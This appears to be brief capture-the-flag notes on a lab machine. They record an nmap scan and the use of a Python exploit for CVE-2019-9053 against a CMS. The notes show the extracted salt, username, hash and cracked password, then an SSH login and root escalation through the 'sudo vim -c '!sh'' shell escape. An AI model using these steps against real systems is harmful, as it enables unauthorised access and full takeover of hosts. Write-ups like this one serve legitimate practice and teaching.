nmap scan 
open ports:
http 
ssh 
ftp

http is using cms .2.2.9
it has a CVE 2019-9053

from python scrpt i extracred 

[+] Salt for password found: 1dac0d92e9fa6bb2
[+] Username found: mitch
[+] Email found: admin@admin.com
[+] Password found (hash): 0c01f4468bd75d7a84c7eb73846e8d96
[*] Password: secret

log in to ssh on port 2222
sudo -l 
mitch has root privileges
we can log in using vim 

sudo vim -c '!sh'

whoami
root

cat /root/root.txt 

